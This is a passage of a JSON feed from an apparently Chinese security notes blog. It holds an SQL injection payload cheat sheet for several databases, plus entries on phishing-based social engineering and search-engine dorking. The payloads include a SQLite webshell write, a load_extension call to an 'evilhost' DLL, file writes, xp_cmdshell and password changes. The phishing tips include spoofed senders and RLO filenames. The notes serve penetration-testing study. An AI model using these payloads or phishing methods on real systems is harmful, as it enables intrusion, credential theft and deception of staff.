'0:0:3'</code>  pause for 3 seconds</li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'</code></li>\n</ul>\n</li>\n<li>\n<p>Trick</p>\n<ul>\n<li><code>id=1 union:select password from:user</code></li>\n</ul>\n</li>\n<li>\n<p>文件读取</p>\n<ul>\n<li>OpenRowset</li>\n</ul>\n</li>\n<li>\n<p>当前查询语句</p>\n<ul>\n<li><code>select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</code></li>\n</ul>\n</li>\n<li>\n<p>hostname</p>\n<ul>\n<li>用于判断是否站库分离</li>\n<li><code>select host_name()</code></li>\n<li><code>exec xp_getnetname</code></li>\n</ul>\n</li>\n<li>\n<p>服务器信息</p>\n<ul>\n<li><code>exec xp_msver</code></li>\n</ul>\n</li>\n<li>\n<p>系统配置</p>\n<ul>\n<li><code>select * from sys.configurations;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"注册表读写\"><a class=\"anchor\" href=\"#注册表读写\">#</a> 注册表读写</h3>\n<ul>\n<li>\n<p><code>xp_regread</code></p>\n<ul>\n<li><code>exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'</code></li>\n</ul>\n</li>\n<li>\n<p><code>xp_regwrite</code></p>\n</li>\n<li>\n<p><code>xp_regdeletvalue</code></p>\n</li>\n<li>\n<p><code>xp_regdeletkey</code></p>\n</li>\n<li>\n<p><code>xp_regaddmultistring</code></p>\n</li>\n</ul>\n<h3 id=\"报错注入-2\"><a class=\"anchor\" href=\"#报错注入-2\">#</a> 报错注入</h3>\n<ul>\n<li><code>1=convert(int,(db_name()))</code></li>\n</ul>\n<h3 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h3>\n<ul>\n<li>SUSER_NAME()</li>\n<li>USER_NAME()</li>\n<li>PERMISSIONS()</li>\n<li>DB_NAME()</li>\n<li>FILE_NAME()</li>\n<li>TYPE_NAME()</li>\n<li>COL_NAME()</li>\n</ul>\n<h3 id=\"dns-oob\"><a class=\"anchor\" href=\"#dns-oob\">#</a> DNS OOB</h3>\n<ul>\n<li>fn_xe_file_target_read_file</li>\n<li>fn_get_audit_file</li>\n<li>fn_trace_gettable</li>\n</ul>\n<h3 id=\"其他常用存储过程\"><a class=\"anchor\" href=\"#其他常用存储过程\">#</a> 其他常用存储过程</h3>\n<ul>\n<li>sp_execute_external_script</li>\n<li>sp_makewebtask</li>\n<li>sp_OACreate</li>\n<li>sp_OADestroy</li>\n<li>sp_OAGetErrorInfo</li>\n<li>sp_OAGetProperty</li>\n<li>sp_OAMethod</li>\n<li>sp_OASetProperty</li>\n<li>sp_OAStop</li>\n<li>xp_cmdshell</li>\n<li>xp_dirtree</li>\n<li>xp_enumerrorlogs</li>\n<li>xp_enumgroups</li>\n<li>xp_fixeddrives</li>\n<li>xp_getfiledetails</li>\n<li>xp_loginconfig</li>\n</ul>\n<h2 id=\"mysql-payload\"><a class=\"anchor\" href=\"#mysql-payload\">#</a> MySQL Payload</h2>\n<h3 id=\"常见payload-2\"><a class=\"anchor\" href=\"#常见payload-2\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT 1 # comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x9</code>   <code>0xa-0xd</code>   <code>0x20</code>   <code>0xa0</code></li>\n</ul>\n</li>\n<li>\n<p>Current User</p>\n<ul>\n<li><code>SELECT user()</code></li>\n<li><code>SELECT system_user()</code></li>\n<li><code>SELECT current_role()</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<ul>\n<li><code>SELECT user FROM mysql.user</code></li>\n</ul>\n</li>\n<li>\n<p>Current Database</p>\n<ul>\n<li><code>SELECT database()</code></li>\n</ul>\n</li>\n<li>\n<p>List Database</p>\n<ul>\n<li><code>SELECT schema_name FROM information_schema.schemata</code></li>\n</ul>\n</li>\n<li>\n<p>List Tables</p>\n<ul>\n<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>List Columns</p>\n<ul>\n<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>If</p>\n<ul>\n<li><code>SELECT if(1=1,'foo','bar');</code>  return 'foo'</li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li>`SELECT char(0x41)</li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT 0x414243</code>  =&gt; return  <code>ABC</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>sleep(1)</code></li>\n<li><code>SELECT BENCHMARK(1000000,MD5('A'))</code></li>\n</ul>\n</li>\n<li>\n<p>Read File</p>\n<ul>\n<li><code>select @@datadir``select load_file('databasename/tablename.MYD')</code></li>\n</ul>\n</li>\n<li>\n<p>Blind</p>\n<ul>\n<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>\n</ul>\n</li>\n<li>\n<p>Error Based</p>\n<ul>\n<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>\n<li><code>select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))</code></li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"报错注入常见函数\"><a class=\"anchor\" href=\"#报错注入常见函数\">#</a> 报错注入常见函数</h4>\n<ul>\n<li>extractvalue</li>\n<li>updatexml</li>\n<li>GeometryCollection</li>\n<li>linestring</li>\n<li>multilinestring</li>\n<li>multipoint</li>\n<li>multipolygon</li>\n<li>polygon</li>\n<li>exp</li>\n</ul>\n<h3 id=\"写文件\"><a class=\"anchor\" href=\"#写文件\">#</a> 写文件</h3>\n<h4 id=\"写文件前提\"><a class=\"anchor\" href=\"#写文件前提\">#</a> 写文件前提</h4>\n<ul>\n<li>root 权限</li>\n<li>知晓文件绝对路径</li>\n<li>写入的路径存在写入权限</li>\n<li>secure_file_priv 允许向对应位置写入</li>\n<li><code>select count(file_priv) from mysql.user</code></li>\n</ul>\n<h4 id=\"基于into写文件\"><a class=\"anchor\" href=\"#基于into写文件\">#</a> 基于 into 写文件</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr></table></figure><p>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>\n<h4 id=\"基于log写文件\"><a class=\"anchor\" href=\"#基于log写文件\">#</a> 基于 log 写文件</h4>\n<pre><code>show variables like '%general%';\nset global general_log = on;\nset global general_log_file = '/path/to/file';\nselect '&lt;?php var_dump(&quot;test&quot;);?&gt;';\nset global general_log_file = '/original/path';\nset global general_log = off;\n</code></pre>\n<h2 id=\"postgressql-payload\"><a class=\"anchor\" href=\"#postgressql-payload\">#</a> PostgresSQL Payload</h2>\n<ul>\n<li>Version\n<ul>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>Comment\n<ul>\n<li><code>SELECT 1 -- comment``SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>Current User\n<ul>\n<li><code>SELECT user</code></li>\n<li><code>SELECT current_user</code></li>\n<li>``SELECT session_user`</li>\n<li><code>SELECT getpgusername()</code></li>\n</ul>\n</li>\n<li>List User\n<ul>\n<li><code>SELECT usename FROM pg_user</code></li>\n</ul>\n</li>\n<li>Current Database\n<ul>\n<li><code>SELECT current_database()</code></li>\n</ul>\n</li>\n<li>List Database\n<ul>\n<li><code>SELECT datname FROM pg_database</code></li>\n</ul>\n</li>\n<li>Ascii\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n</ul>\n</li>\n<li>Delay\n<ul>\n<li><code>pg_sleep(1)</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle-payload\"><a class=\"anchor\" href=\"#oracle-payload\">#</a> Oracle Payload</h2>\n<h3 id=\"常见payload-3\"><a class=\"anchor\" href=\"#常见payload-3\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<ul>\n<li>\n<p>dump</p>\n<p><code>select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = 'table_name';``select column_name, data_type from user_tab_columns where table_name = 'table_name';``SELECT * FROM ALL_TABLES</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Comment</p>\n<p><code>--``/**/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Space</p>\n<p><code>0x00</code>   <code>0x09</code>   <code>0xa-0xd</code>   <code>0x20</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>报错</p>\n<p><code>utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>OOB</p>\n<p><code>utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>绕过</p>\n<p><code>rawtohex</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"写文件-2\"><a class=\"anchor\" href=\"#写文件-2\">#</a> 写文件</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> directory TEST_DIR <span class=\"token keyword\">as</span> <span class=\"token string\">'/path/to/dir'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">read</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">write</span> <span class=\"token keyword\">on</span> directory TEST_DIR <span class=\"token keyword\">to</span> system<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   isto_file utl_file<span class=\"token punctuation\">.</span>file_type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">begin</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   isto_file :<span class=\"token operator\">=</span> utl_file<span class=\"token punctuation\">.</span>fopen<span class=\"token punctuation\">(</span><span class=\"token string\">'TEST_DIR'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test.jsp'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>put_line<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;% out.println(\"test\"); %>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fflush<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fclose<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"sqlite3-payload\"><a class=\"anchor\" href=\"#sqlite3-payload\">#</a> SQLite3 Payload</h2>\n<ul>\n<li>Comment\n<ul>\n<li><code>--</code></li>\n<li><code>/**/</code></li>\n</ul>\n</li>\n<li>Version\n<ul>\n<li><code>select sqlite_version();</code></li>\n</ul>\n</li>\n</ul>\n<p>Command Execution</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ATTACH <span class=\"token keyword\">DATABASE</span> <span class=\"token string\">'/var/www/lol.php'</span> <span class=\"token keyword\">AS</span> lol<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?system($_GET['</span>cmd<span class=\"token string\">']); ?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><p>Load_extension</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_extension<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\evilhost\\evil.dll'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"nosql-payload\"><a class=\"anchor\" href=\"#nosql-payload\">#</a> NoSQL Payload</h2>\n<h3 id=\"常见payload-4\"><a class=\"anchor\" href=\"#常见payload-4\">#</a> 常见 Payload</h3>\n<ul>\n<li>绕过限制条件\n<ul>\n<li><code>&#123;&quot;username&quot;: &quot;user&quot;&#125;</code>  =&gt;  <code>&#123;&quot;username&quot;: &#123;&quot;ne&quot;: &quot;fakeuser&quot;&#125;&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n</ul>\n</li>\n<li>测试用字符\n<ul>\n<li><code>'&quot;\\/$[].&gt;</code></li>\n</ul>\n</li>\n<li>布尔测试常用\n<ul>\n<li><code>&#123;&quot;$ne&quot;: -1&#125;</code></li>\n<li><code>&#123;&quot;$in&quot;: []&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n<li><code>&#123;&quot;$or&quot;: [&#123;&#125;,&#123;&quot;foo&quot;:&quot;1&quot;&#125;]&#125;</code></li>\n</ul>\n</li>\n<li>时间\n<ul>\n<li><code>&#123;&quot;$where&quot;: &quot;sleep(100)&quot;&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"预编译\"><a class=\"anchor\" href=\"#预编译\">#</a> 预编译</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>\n<h2 id=\"模拟预编译\"><a class=\"anchor\" href=\"#模拟预编译\">#</a> 模拟预编译</h2>\n<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<h3 id=\"预编译使用错误\"><a class=\"anchor\" href=\"#预编译使用错误\">#</a> 预编译使用错误</h3>\n<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>\n<h3 id=\"部分参数不可预编译\"><a class=\"anchor\" href=\"#部分参数不可预编译\">#</a> 部分参数不可预编译</h3>\n<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>\n<h3 id=\"预编译实现错误\"><a class=\"anchor\" href=\"#预编译实现错误\">#</a> 预编译实现错误</h3>\n<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=\">sqlmap time based inject 分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp\">SQLInjectionWiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==\">常见数据库写入 Webshell 汇总</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==\">MSSQL 数据库攻击实战指北</span></li>\n</ul>\n<h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==\">SQL 注入 ByPass 的一些小技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4\">Waf Bypass 之道</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ\">MySQL Bypass Wiki</span></li>\n</ul>\n<h2 id=\"nosql\"><a class=\"anchor\" href=\"#nosql\">#</a> NoSQL</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=\">NoSQL 注入的分析和缓解</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==\">NoSQL 注入</span></li>\n</ul>\n<h2 id=\"cheatsheet-2\"><a class=\"anchor\" href=\"#cheatsheet-2\">#</a> Cheatsheet</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=\">MSSQL Pentest Cheatsheet</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "SQL注入"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/Social%20Engineering/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/Social%20Engineering/",
            "title": "社会工程学",
            "date_published": "2022-11-26T02:57:49.000Z",
            "content_html": "<h1 id=\"企业信息收集\"><a class=\"anchor\" href=\"#企业信息收集\">#</a> 企业信息收集</h1>\n<p>一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。</p>\n<p>公司主站中会有业务方向、合作单位等信息。</p>\n<h1 id=\"人员信息收集\"><a class=\"anchor\" href=\"#人员信息收集\">#</a> 人员信息收集</h1>\n<p>针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、开发、运维、财务、人事、业务人员的个人电脑。</p>\n<p>人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。</p>\n<p>在获取这些信息后，可以在 Github/Linkedin 等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。</p>\n<p>此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。</p>\n<h1 id=\"钓鱼\"><a class=\"anchor\" href=\"#钓鱼\">#</a> 钓鱼</h1>\n<p>基于之前收集到的信息，可以使用 Office/CHM/RAR/EXE/ 快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。</p>\n<p>其中 Office 可以使用 Office 漏洞、宏、OLE 对象、PPSX 等方式构造利用文件。</p>\n<p>Exe 可以使用特殊的 Unicode 控制字符如 RLO (Right-to-Left Override) 等来构建容易混淆的文件名。</p>\n<p>RAR 主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。</p>\n<p>如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。</p>\n<p>需要注意的是，钓鱼测试也需要注意合规问题，不能冒充监管单位、不能发送违法违规信息。具体可以参考《中华人民共和国电信条例》、《中华人民共和国互联网电子邮件服务管理办法》等法律法规。</p>\n<h1 id=\"其他信息\"><a class=\"anchor\" href=\"#其他信息\">#</a> 其他信息</h1>\n<p>公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如 VPN / 堡垒机账号、TeamViewer 账号、网络设备默认口令、服务器默认口令等。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy8xNTQ0MS5odG1s\">端口渗透总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQwOQ==\">未授权访问总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYWF0TmpleTNzd1p6N1Q0WXdfTHFzUQ==\">红队测试之邮箱打点</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZHFudGpSTGdjT0QzRDJiaTFvREZBdw==\">邮件伪造之 SPF 绕过的 5 种思路</span></li>\n</ul>\n",
            "tags": [
                "信息收集",
                "社会工程学"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/search%20engine/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/search%20engine/",
            "title": "搜索引擎利用",
            "date_published": "2022-11-26T02:10:49.000Z",
            "content_html": "<p>恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu 等）可以获取目标站点的较多信息。</p>\n<h1 id=\"搜索引擎处理流程\"><a class=\"anchor\" href=\"#搜索引擎处理流程\">#</a> 搜索引擎处理流程</h1>\n<ul>\n<li>\n<p>数据预处理</p>\n<ul>\n<li>长度截断</li>\n<li>大小写转化</li>\n<li>去标点符号</li>\n<li>简繁转换</li>\n<li>数字归一化，中文数字、阿拉伯数字、罗马字</li>\n<li>同义词改写</li>\n<li>拼音改写</li>\n</ul>\n</li>\n<li>\n<p>处理</p>\n<ul>\n<li>分词</li>\n<li>关键词抽取</li>\n<li>非法信息过滤</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"搜索技巧\"><a class=\"anchor\" href=\"#搜索技巧\">#</a> 搜索技巧</h1>\n<ul>\n<li>\n<p>site:www.hao123.com</p>\n<ul>\n<li>返回此目标站点被搜索引擎抓取收录的所有内容</li>\n</ul>\n</li>\n<li>\n<p>site:www.hao123.com keyword</p>\n<ul>\n<li>返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面</li>\n<li>此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等</li>\n</ul>\n</li>\n<li>\n<p>site:www.hao123.com inurl:admin.php</p>\n<ul>\n<li>返回目标站点的地址中包含 admin.php 的所有页面，可以使用 admin.php/manage.php 或者其他关键词来寻找关键功能页面</li>\n</ul>\n</li>\n<li>\n<p>link:www.hao123.com</p>\n<ul>\n<li>返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等</li>\n</ul>\n</li>\n<li>\n<p>related:www.hao123.com</p>\n<ul>\n<li>返回所有与目标站点” 相似” 的页面，可能会包含一些通用程序的信息等</li>\n</ul>\n</li>\n<li>\n<p>intitle:&quot;500 Internal Server Error&quot; &quot;server at&quot;</p>\n<ul>\n<li>搜索出错的页面</li>\n</ul>\n</li>\n<li>\n<p>inurl:&quot;nph-proxy.cgi&quot; &quot;Start browsing&quot;</p>\n<ul>\n<li>查找代理服务器</li>\n</ul>\n</li>\n</ul>\n<p>除了以上的关键字，还有 allintile /allinurl/allintext /inanchor/intext /filetype/info /numberange/cache 等。</p>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<ul>\n<li><code>*</code>  代表某一个单词</li>\n<li>OR 或者 | 代表逻辑或</li>\n<li>单词前跟  <code>+</code>  表强制查询</li>\n<li>单词前跟  <code>-</code>  表排除对应关键字</li>\n<li><code>&quot;</code>  强调关键字</li>\n</ul>\n<h2 id=\"tips\"><a class=\"anchor\" href=\"#tips\">#</a> tips</h2>\n<ul>\n<li>查询不区分大小写</li>\n<li>括号会被忽略</li>\n<li>默认用 and 逻辑进行搜索</li>\n</ul>\n<h1 id=\"快照\"><a class=\"anchor\" href=\"#快照\">#</a> 快照</h1>\n<p>搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。</p>\n<p>另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNoaXZlLm9yZy8=\">Archive.org</span> 等。</p>\n<h1 id=\"github\"><a class=\"anchor\" href=\"#github\">#</a> Github</h1>\n<p>在 Github 中，可能会存在源码泄露、AccessKey 泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：</p>\n<ul>\n<li><code>@example.com password/pass/pwd/secret/credentials/token</code></li>\n<li><code>@example.com username/user/key/login/ftp/</code></li>\n<li><code>@example.com config/ftp/smtp/pop</code></li>\n<li><code>@example.com security_credentials/connetionstring</code></li>\n<li><code>@example.com JDBC/ssh2_auth_password/send_keys</code></li>\n</ul>\n",
            "tags": [
                "信息收集",
                "搜索"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/website%20information/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/website%20information/",
            "title": "站点信息",
            "date_published": "2022-11-26T02:03:09.000Z",
